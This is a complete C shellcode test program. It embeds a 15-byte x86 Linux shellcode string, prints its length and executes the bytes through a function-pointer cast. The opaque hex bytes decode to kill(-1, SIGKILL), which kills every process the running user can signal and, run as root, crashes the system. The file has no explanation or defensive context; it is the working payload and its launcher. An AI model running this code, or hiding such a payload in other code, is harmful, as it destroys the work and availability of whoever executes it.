#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x29\xc0\xb0\x23\xfe\xc0\xfe\xc0\x6a\xff\x5b\xb1\x09\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
